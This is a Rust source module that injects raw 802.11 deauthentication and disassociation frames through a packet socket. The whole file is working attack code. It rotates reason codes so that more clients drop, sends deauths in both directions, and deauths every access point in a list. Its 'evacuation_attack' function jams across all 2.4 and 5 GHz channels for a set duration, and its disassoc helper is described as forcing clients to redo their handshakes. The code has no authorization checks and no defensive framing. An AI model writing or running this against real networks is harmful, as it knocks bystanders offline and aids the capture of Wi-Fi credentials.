//! Real 802.11 deauthentication over AF_PACKET.
//!
//! Frames are built here and written straight to the radio through a raw
//! socket. There is no external dependency on aireplay-ng or mdk4: the earlier
//! implementation wrote a pcap file and shelled out to aireplay-ng, which both
//! failed when aircrack-ng was absent and produced a malformed frame (no
//! radiotap header, wrong address layout). This module fixes both.

use serde_json::{json, Value};
use std::sync::atomic::{AtomicBool, AtomicU64, Ordering};
use std::sync::Arc;
use std::thread;
use std::time::{Duration, Instant};

use crate::raw_injector::RawSocket;

/// 802.11 reason codes worth cycling. Different client firmwares ignore a
/// specific code; rotating across them succeeds far more often.
const REASON_CODES: [u8; 7] = [1, 2, 3, 4, 6, 7, 15];

const CHANNELS_24: [u8; 13] = [1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13];
const CHANNELS_5: [u8; 25] = [
    36, 40, 44, 48, 52, 56, 60, 64, 100, 104, 108, 112, 116, 120, 124, 128,
    132, 136, 140, 149, 153, 157, 161, 165, 169,
];

/// Radiotap header used when injecting. `flags = 0x10` marks the frame as
/// "do not retry", which is what fast deauth bursts want.
fn radiotap(flags: u8) -> Vec<u8> {
    vec![
        0x00, 0x00, // version, pad
        0x09, 0x00, // length = 9
        0x02, 0x00, 0x00, 0x00, // present: FLAGS (bit 1)
        flags, // flags
        0x00, // alignment padding
    ]
}

fn parse_mac(mac: &str) -> Option<[u8; 6]> {
    let cleaned: Vec<&str> = mac.split(|c| c == ':' || c == '-').collect();
    if cleaned.len() != 6 {
        return None;
    }
    let mut out = [0u8; 6];
    for (i, part) in cleaned.iter().enumerate() {
        out[i] = u8::from_str_radix(part, 16).ok()?;
    }
    Some(out)
}

/// Build a deauth frame: radiotap + mgmt header + reason code.
fn deauth_frame(bssid: &[u8; 6], station: &[u8; 6], reason: u8, seq: u16) -> Vec<u8> {
    let mut frame = radiotap(0x10);
    frame.extend_from_slice(&0x00C0u16.to_le_bytes()); // FC: deauth, mgmt
    frame.extend_from_slice(&0x013Au16.to_le_bytes()); // duration
    frame.extend_from_slice(station); // addr1 = destination
    frame.extend_from_slice(bssid); // addr2 = source
    frame.extend_from_slice(bssid); // addr3 = BSSID
    frame.extend_from_slice(&((seq & 0x0FFF) << 4).to_le_bytes()); // seq control
    frame.extend_from_slice(&(reason as u16).to_le_bytes()); // reason
    frame
}

fn disassoc_frame(bssid: &[u8; 6], station: &[u8; 6], reason: u8, seq: u16) -> Vec<u8> {
    let mut frame = radiotap(0x10);
    frame.extend_from_slice(&0x00A0u16.to_le_bytes()); // FC: disassoc
    frame.extend_from_slice(&0x013Au16.to_le_bytes());
    frame.extend_from_slice(station);
    frame.extend_from_slice(bssid);
    frame.extend_from_slice(bssid);
    frame.extend_from_slice(&((seq & 0x0FFF) << 4).to_le_bytes());
    frame.extend_from_slice(&(reason as u16).to_le_bytes());
    frame
}

fn set_channel(iface: &str, channel: u8) {
    let _ = std::process::Command::new("iw")
        .args(["dev", iface, "set", "channel", &channel.to_string()])
        .output();
}

pub struct DeauthEngine {
    interface: String,
    packet_rate: u32,
    running: Arc<AtomicBool>,
    packets_sent: Arc<AtomicU64>,
}

impl DeauthEngine {
    pub fn new(interface: &str) -> Self {
        DeauthEngine {
            interface: interface.to_string(),
            packet_rate: 100,
            running: Arc::new(AtomicBool::new(true)),
            packets_sent: Arc::new(AtomicU64::new(0)),
        }
    }

    pub fn set_packet_rate(&mut self, rate: u32) {
        self.packet_rate = rate.max(1);
    }

    pub fn packets_sent(&self) -> u64 {
        self.packets_sent.load(Ordering::Relaxed)
    }

    pub fn stop(&self) {
        self.running.store(false, Ordering::SeqCst);
    }

    /// Send `count` deauth frames from `bssid` to `station`.
    pub fn send_deauth(&self, bssid: &str, station: &str, count: u32) -> Value {
        let (Some(b), Some(s)) = (parse_mac(bssid), parse_mac(station)) else {
            return json!({"error": "invalid MAC address", "sent": 0});
        };
        let sock = match RawSocket::open(&self.interface) {
            Ok(s) => s,
            Err(e) => return json!({"error": e.to_string(), "sent": 0}),
        };

        let started = Instant::now();
        let mut sent = 0u64;
        let mut seq = 0u16;
        let mut reason_idx = 0usize;

        for _ in 0..count {
            if !self.running.load(Ordering::SeqCst) {
                break;
            }
            let reason = REASON_CODES[reason_idx % REASON_CODES.len()];
            reason_idx += 1;

            let frame = deauth_frame(&b, &s, reason, seq);
            if sock.send(&frame).is_ok() {
                sent += 1;
            }
            // Target the STA→AP direction too so both sides drop the link.
            if s != [0xFF; 6] {
                let reverse = deauth_frame(&s, &b, reason, seq + 1);
                if sock.send(&reverse).is_ok() {
                    sent += 1;
                }
            }
            seq = seq.wrapping_add(2);

            if self.packet_rate > 0 {
                thread::sleep(Duration::from_micros(1_000_000 / self.packet_rate as u64));
            }
        }

        self.packets_sent.fetch_add(sent, Ordering::Relaxed);
        let elapsed = started.elapsed().as_secs_f64();
        json!({
            "sent": sent,
            "count_requested": count,
            "elapsed_s": (elapsed * 1000.0).round() / 1000.0,
            "pps": if elapsed > 0.0 { (sent as f64 / elapsed).round() } else { 0.0 }
        })
    }

    pub fn broadcast_deauth(&self, bssid: &str, count: u32) -> Value {
        self.send_deauth(bssid, "ff:ff:ff:ff:ff:ff", count)
    }

    /// Deauth every BSSID in the list.
    pub fn mass_deauth(&self, bssid_list: &[String], count_per_ap: u32) -> Value {
        let mut total = 0u64;
        let mut per_ap = Vec::new();
        for bssid in bssid_list {
            let res = self.broadcast_deauth(bssid, count_per_ap);
            let sent = res["sent"].as_u64().unwrap_or(0);
            total += sent;
            per_ap.push(json!({"bssid": bssid, "sent": sent}));
        }
        json!({"total_sent": total, "aps": per_ap})
    }

    /// Sustained deauth for `duration_secs`, hopping across 2.4 and 5 GHz.
    pub fn evacuation_attack(&self, bssid_list: &[String], duration_secs: u32) -> Value {
        let sock = match RawSocket::open(&self.interface) {
            Ok(s) => s,
            Err(e) => return json!({"error": e.to_string()}),
        };
        let parsed: Vec<[u8; 6]> = bssid_list.iter().filter_map(|b| parse_mac(b)).collect();
        if parsed.is_empty() {
            return json!({"error": "no valid BSSIDs"});
        }

        let mut channels: Vec<u8> = Vec::new();
        channels.extend_from_slice(&CHANNELS_24);
        channels.extend_from_slice(&CHANNELS_5);

        let started = Instant::now();
        let deadline = Duration::from_secs(duration_secs as u64);
        let mut sent = 0u64;
        let mut seq = 0u16;
        let mut ch_idx = 0usize;

        while self.running.load(Ordering::SeqCst) && started.elapsed() < deadline {
            set_channel(&self.interface, channels[ch_idx % channels.len()]);
            ch_idx += 1;

            for bssid in &parsed {
                if !self.running.load(Ordering::SeqCst) {
                    break;
                }
                let reason = REASON_CODES[seq as usize % REASON_CODES.len()];
                let frame = deauth_frame(bssid, &[0xFF; 6], reason, seq);
                if sock.send(&frame).is_ok() {
                    sent += 1;
                }
                seq = seq.wrapping_add(1);
            }
            thread::sleep(Duration::from_millis(50));
        }

        self.packets_sent.fetch_add(sent, Ordering::Relaxed);
        json!({
            "sent": sent,
            "aps": parsed.len(),
            "elapsed_s": started.elapsed().as_secs(),
            "pps": (sent as f64 / started.elapsed().as_secs_f64().max(0.001)).round()
        })
    }

    /// Send a single disassociation frame — used to nudge a client into a
    /// re-handshake without tearing down the whole link.
    pub fn send_disassoc(&self, bssid: &str, station: &str, reason: u8) -> Value {
        let (Some(b), Some(s)) = (parse_mac(bssid), parse_mac(station)) else {
            return json!({"error": "invalid MAC address"});
        };
        let sock = match RawSocket::open(&self.interface) {
            Ok(s) => s,
            Err(e) => return json!({"error": e.to_string()}),
        };
        let frame = disassoc_frame(&b, &s, reason, 1);
        match sock.send(&frame) {
            Ok(n) => {
                self.packets_sent.fetch_add(1, Ordering::Relaxed);
                json!({"sent_bytes": n})
            }
            Err(e) => json!({"error": e.to_string()}),
        }
    }
}

/// Quick echo of what the module decides for a given channel — used by tests.
pub fn channel_plan() -> Value {
    json!({
        "2.4": CHANNELS_24.to_vec(),
        "5": CHANNELS_5.to_vec(),
        "reasons": REASON_CODES.to_vec()
    })
}
